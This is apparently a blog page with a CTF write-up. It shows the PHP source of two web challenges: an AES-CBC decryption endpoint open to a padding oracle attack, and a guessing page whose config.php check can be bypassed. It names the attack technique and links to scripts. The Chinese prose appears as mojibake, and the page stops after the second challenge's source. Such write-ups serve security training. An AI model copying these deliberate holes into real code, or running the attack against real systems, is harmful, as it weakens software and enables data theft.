<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>BuuctfDay9 | Manayakko - å¾®ç¬‘æ‰æ˜¯ç‹é“</title><meta name="description" content="BuuctfDay9"><meta name="keywords" content="writeup,ctf"><meta name="author" content="Manayakko"><meta name="copyright" content="Manayakko"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/yakko117/img/favicon.png"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><meta name="twitter:card" content="summary"><meta name="twitter:title" content="BuuctfDay9"><meta name="twitter:description" content="BuuctfDay9"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg"><meta property="og:type" content="article"><meta property="og:title" content="BuuctfDay9"><meta property="og:url" content="https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/"><meta property="og:site_name" content="Manayakko - å¾®ç¬‘æ‰æ˜¯ç‹é“"><meta property="og:description" content="BuuctfDay9"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/yakko117/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/"><link rel="prev" title="BuuctfDay10" href="https://manayakko.github.io/yakko117/2022/01/04/BUUCTFDay10/"><link rel="next" title="Ha1cyonCTF2020-å…¬å¼€èµ›" href="https://manayakko.github.io/yakko117/2020/04/18/NPUCTF2020/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/yakko117/',
  algolia: undefined,
  localSearch: {"path":"./search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç®€"},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: 'æŒ‰',
    message_next: 'é”®å°†æœ¬é¡µåŠ å…¥ä¹¦ç­¾'
  },
  runtime_unit: 'å¤©',
  runtime: false,
  copyright: {"languages":{"author":"ä½œè€…: Manayakko","link":"é“¾æ¥: https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/","source":"æ¥æº: Manayakko - å¾®ç¬‘æ‰æ˜¯ç‹é“","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/yakko117/atom.xml" title="Manayakko - å¾®ç¬‘æ‰æ˜¯ç‹é“" type="application/atom+xml">
</head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/yakko117/">Manayakko - å¾®ç¬‘æ‰æ˜¯ç‹é“</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yakko117/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/yakko117/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/yakko117/link/"><i class="fa-fw fa fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="/yakko117/about/"><i class="fa-fw fa fa-simplybuilt"></i><span> å…³äºæœ¬äºº</span></a></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> æœç´¢</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/yakko117/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/yakko117/archives/"><div class="headline">æ–‡ç« </div><div class="length_num">71</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/yakko117/tags/"><div class="headline">æ ‡ç­¾</div><div class="length_num">12</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/yakko117/categories/"><div class="headline">åˆ†ç±»</div><div class="length_num">5</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yakko117/"><i class="fa-fw fa fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/yakko117/archives/"><i class="fa-fw fa fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/yakko117/link/"><i class="fa-fw fa fa-link"></i><span> å‹æƒ…é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="/yakko117/about/"><i class="fa-fw fa fa-simplybuilt"></i><span> å…³äºæœ¬äºº</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">ç›®å½•</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#NPUCTF2020-web%F0%9F%90%95"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">[NPUCTF2020] webğŸ•</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc_mobile_items-number">1.1.</span> <span class="toc_mobile_items-text">è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">[Zer0pts2020]Can you guess it?</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#%E4%B8%BB%E8%A6%81%E8%AF%B4%E4%B8%80%E4%B8%8B%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E7%82%B9"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#%E4%BB%A5%E4%B8%8D%E5%90%8C%E6%95%A3%E5%88%97%E7%B1%BB%E5%9E%8B%E4%BD%BF%E7%94%A8-crypt"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CRYPT-STD-DES-%E5%9F%BA%E4%BA%8E%E6%A0%87%E5%87%86-DES-%E7%AE%97%E6%B3%95%E7%9A%84%E6%95%A3%E5%88%97%E4%BD%BF%E7%94%A8"><span class="toc_mobile_items-number">2.2.1.</span> <span class="toc_mobile_items-text">CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CRYPT-EXT-DES-%E6%89%A9%E5%B1%95%E7%9A%84%E5%9F%BA%E4%BA%8E-DES-%E7%AE%97%E6%B3%95%E7%9A%84%E6%95%A3%E5%88%97%E3%80%82"><span class="toc_mobile_items-number">2.2.2.</span> <span class="toc_mobile_items-text">CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CRYPT-MD5-MD5-%E6%95%A3%E5%88%97"><span class="toc_mobile_items-number">2.2.3.</span> <span class="toc_mobile_items-text">CRYPT_MD5 - MD5 æ•£åˆ—</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CRYPT-BLOWFISH-Blowfish-%E7%AE%97%E6%B3%95"><span class="toc_mobile_items-number">2.2.4.</span> <span class="toc_mobile_items-text">CRYPT_BLOWFISH - Blowfish ç®—æ³•</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CRYPT-SHA256-x2F-SHA512-%E6%95%A3%E5%88%97%E7%AE%97%E6%B3%95"><span class="toc_mobile_items-number">2.2.5.</span> <span class="toc_mobile_items-text">CRYPT_SHA256&#x2F;SHA512 æ•£åˆ—ç®—æ³•</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#%E5%9B%9E%E5%BD%92%E5%88%B0%E8%A7%A3%E9%A2%98%E6%9C%AC%E8%BA%AB"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">å›å½’åˆ°è§£é¢˜æœ¬èº«</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#%E6%80%9D%E8%B7%AF1"><span class="toc_mobile_items-number">2.3.1.</span> <span class="toc_mobile_items-text">æ€è·¯1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#%E6%80%9D%E8%B7%AF2"><span class="toc_mobile_items-number">2.3.2.</span> <span class="toc_mobile_items-text">æ€è·¯2</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#%E5%8F%A8%E9%80%BC%E5%87%A0%E5%8F%A5"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">å¨é€¼å‡ å¥</span></a></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NPUCTF2020-web%F0%9F%90%95"><span class="toc-number">1.</span> <span class="toc-text">[NPUCTF2020] webğŸ•</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">è€ƒç‚¹ï¼š</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">2.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E8%AF%B4%E4%B8%80%E4%B8%8B%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">ä¸»è¦è¯´ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5%E4%B8%8D%E5%90%8C%E6%95%A3%E5%88%97%E7%B1%BB%E5%9E%8B%E4%BD%BF%E7%94%A8-crypt"><span class="toc-number">2.2.</span> <span class="toc-text">ä»¥ä¸åŒæ•£åˆ—ç±»å‹ä½¿ç”¨ crypt()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPT-STD-DES-%E5%9F%BA%E4%BA%8E%E6%A0%87%E5%87%86-DES-%E7%AE%97%E6%B3%95%E7%9A%84%E6%95%A3%E5%88%97%E4%BD%BF%E7%94%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">CRYPT_STD_DES - åŸºäºæ ‡å‡† DES ç®—æ³•çš„æ•£åˆ—ä½¿ç”¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPT-EXT-DES-%E6%89%A9%E5%B1%95%E7%9A%84%E5%9F%BA%E4%BA%8E-DES-%E7%AE%97%E6%B3%95%E7%9A%84%E6%95%A3%E5%88%97%E3%80%82"><span class="toc-number">2.2.2.</span> <span class="toc-text">CRYPT_EXT_DES - æ‰©å±•çš„åŸºäº DES ç®—æ³•çš„æ•£åˆ—ã€‚</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPT-MD5-MD5-%E6%95%A3%E5%88%97"><span class="toc-number">2.2.3.</span> <span class="toc-text">CRYPT_MD5 - MD5 æ•£åˆ—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPT-BLOWFISH-Blowfish-%E7%AE%97%E6%B3%95"><span class="toc-number">2.2.4.</span> <span class="toc-text">CRYPT_BLOWFISH - Blowfish ç®—æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPT-SHA256-x2F-SHA512-%E6%95%A3%E5%88%97%E7%AE%97%E6%B3%95"><span class="toc-number">2.2.5.</span> <span class="toc-text">CRYPT_SHA256&#x2F;SHA512 æ•£åˆ—ç®—æ³•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E5%BD%92%E5%88%B0%E8%A7%A3%E9%A2%98%E6%9C%AC%E8%BA%AB"><span class="toc-number">2.3.</span> <span class="toc-text">å›å½’åˆ°è§£é¢˜æœ¬èº«</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1"><span class="toc-number">2.3.1.</span> <span class="toc-text">æ€è·¯1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2"><span class="toc-number">2.3.2.</span> <span class="toc-text">æ€è·¯2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%A8%E9%80%BC%E5%87%A0%E5%8F%A5"><span class="toc-number">3.</span> <span class="toc-text">å¨é€¼å‡ å¥</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">BuuctfDay9</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> å‘è¡¨äº 2022-01-03<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> æ›´æ–°äº 2023-04-19</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/yakko117/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">åšé¢˜ç¬”è®°</a></span><div class="post-meta-wordcount"><div class="post-meta-pv-cv"></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><p>å¾ˆä¹…æ²¡æ›´æ–°äº†ï¼Œå› ä¸ºå„ç§åŸå› æ‘¸äº†ä¸€å¹´å¤šçš„é±¼</p>
<h1 id="NPUCTF2020-webğŸ•"><a href="#NPUCTF2020-webğŸ•" class="headerlink" title="[NPUCTF2020] webğŸ•"></a>[NPUCTF2020] webğŸ•</h1><p>é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹é¢˜ç›®</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);  <span class="comment">//å®šä¹‰åŠ å¯†æ–¹å¼</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="variable">$key</span>);    <span class="comment">//å®šä¹‰å¯†é’¥</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;6666666666666666&quot;</span>);    <span class="comment">//å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;BR&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IV:&#x27;</span>.<span class="variable">$iv</span>.BR;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,<span class="variable">$iv</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = IV;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$flag</span>;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_encrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&quot;decrypt&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_decrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯&quot;</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h2><ul>
<li>PHP AES åŠ å¯†</li>
<li>CBCå­—èŠ‚ç¿»è½¬æ”»å‡» <a target="_blank" rel="noopener" href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/">å¾®ç¬‘å¸ˆå‚…çš„åˆ†æè®²è§£</a> ä»¥åŠ <a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html">wooyunçš„æŠ€æœ¯åˆ†æå¸–</a></li>
<li>è¿˜æœ‰è¿™ç¯‡ <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/15504.html">Padding Oracleæ”»å‡»çš„åˆ†æå’Œæ€è€ƒï¼ˆè¯¦ç»†ï¼‰</a></li>
</ul>
<p>ç¨‹åºæ˜¯ <code>128ä½çš„cbc</code>ï¼Œ<code>blocksizeæ˜¯16å­—èŠ‚</code>ï¼ŒåŠ å¯† <code>IV</code> å·²çŸ¥ï¼Œ<code>secret</code> æœªçŸ¥<br>ä½†æ˜¯å¯ä»¥çŸ¥é“è§£å¯†æ˜¯å¦æˆåŠŸï¼Œè€Œä¸”å¯ä»¥æ§åˆ¶å¯†æ–‡å’Œè§£å¯†çš„ <code>IV</code><br>å¯ä»¥ä½¿ç”¨ <code>padding oracle</code> çˆ†å‡ºæ˜æ–‡</p>
<p>ä¸»è¦åŸç†æ˜¯æ ¹æ® <code>cbc</code> åœ¨ <code>IV padding</code> æ­£ç¡®çš„æƒ…å†µä¸‹çš„è¿”å›å€¼å’Œ <code>padding</code> é”™è¯¯ä¸‹çš„è¿”å›å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§é€ä½è¿˜åŸå¯†æ–‡ã€‚</p>
<p>æ‰¾åˆ°ä¸ª<a target="_blank" rel="noopener" href="https://github.com/mpgn/Padding-oracle-attack">è„šæœ¬</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md">https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md</a></p>
<p><a target="_blank" rel="noopener" href="http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/">http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7f171477a603">https://www.jianshu.com/p/7f171477a603</a></p>
<hr>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

